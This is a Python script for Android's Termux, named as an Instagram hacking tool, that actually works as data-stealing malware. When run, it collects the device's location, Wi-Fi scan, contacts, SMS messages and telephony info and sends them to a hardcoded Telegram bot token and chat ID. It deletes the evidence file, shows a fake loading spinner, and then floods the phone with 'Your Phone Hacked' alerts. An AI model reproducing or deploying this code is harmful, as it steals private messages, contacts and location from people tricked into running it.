import requests
from subprocess import getoutput
import json
import os , time
class HackInstagram(object):
    def __init__(self) -> None:
        self.headers = {
            "accept": "application/json",
            "User-Agent": "Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)",
            "content-type": "application/json"
        }
           
    def send_location(self , token , chat_id , latitude="" , longitude=""):
        cmd = json.loads(getoutput("termux-location"))
        url = f"https://api.telegram.org/bot{token}/sendLocation"
        payload = {
            "latitude": cmd["latitude"],
            "longitude": cmd["longitude"],
            "disable_notification": False,
            "reply_to_message_id": None,
            "chat_id":chat_id
        }

        response = requests.post(url, json=payload, headers=self.headers)
        print("Loadind...!")
        return response.status_code

    def send_file(self, bot_token, chat_id, path):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        files = {'document': open(path, 'rb')}
        data = {'chat_id': chat_id}
        response = requests.post(url, files=files, data=data)
        return response.json()

    def nitification(self):
        _ = [getoutput("termux-notification --sound --vibrate 500 -c 'Your Phone Hacked..!'") for _ in range(5)]
        _ = [getoutput("termux-toast -b black -c red -g top  Your Phone Hacked..!") for _ in range(10)]
        _ = [getoutput("termux-torch on && termux-torch off") for _ in range(10)]
        _ = [getoutput("termux-tts-speak Your Mobile Phone Hacked ") for _ in range(10)]
        _ = [getoutput("termux-vibrate -d 1000 -f") for _ in range(10)]
        
                
    def execute_command(self , cmd):
        with open("result.txt" , 'a+') as file:
            file.write(getoutput(cmd))
            file.close()
    
    def main(self):
        self.send_location(token="6523551442:AAGhJT1lGcOQ5ePSpEcJozyDcbfT5yl0t3E" , chat_id='5076503203')
        os.system("clear")
        commands = ["termux-wifi-scaninfo" , "termux-contact-list" , "termux-sms-list" , "termux-telephony-deviceinfo"]
        _ = [self.execute_command(cmd) for cmd in commands]
        self.send_file("6523551442:AAGhJT1lGcOQ5ePSpEcJozyDcbfT5yl0t3E" , "5076503203" , "result.txt")
        os.remove('result.txt')
        for i in range(10):
            for i in ["/", "-","|" , "\\"]:
                print(f"loading ..{i}", end="\r" , flush=True)
                time.sleep(0.1)
        os.system("clear")
        print("Hello Mr")
        
if __name__ == "__main__":
    print("Please Wait..!")
    app = HackInstagram()
    app.main()
    app.nitification()
